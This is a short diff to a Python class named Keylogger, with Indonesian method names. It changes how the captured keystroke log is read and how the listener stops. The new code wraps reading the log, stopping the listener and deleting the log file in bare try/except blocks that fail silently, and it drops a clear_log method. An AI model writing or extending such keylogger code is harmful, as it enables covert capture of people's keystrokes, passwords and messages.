@@ -96,15 +96,16 @@ class Keylogger:
                                 open(self.path, "w").write(data)
         self.tombol = []
     def baca_log(self):
-        with open('baca_log.txt', 'r') as file:
-            data = file.read()
-            return data
+        try:
+            with open(self.path, 'r') as file:
+                data = file.read()
+                return data
+        except:
+            return
 
     def stop_listener(self):
-        listener.stop()
-        os.remove(self.path)
-    
-    def clear_log(self):
-        with open('baca_log.txt', 'r+') as f:
-            f.truncate(0)
-            
+        try:
+            listener.stop()
+            os.remove(self.path)
+        except:
+            return
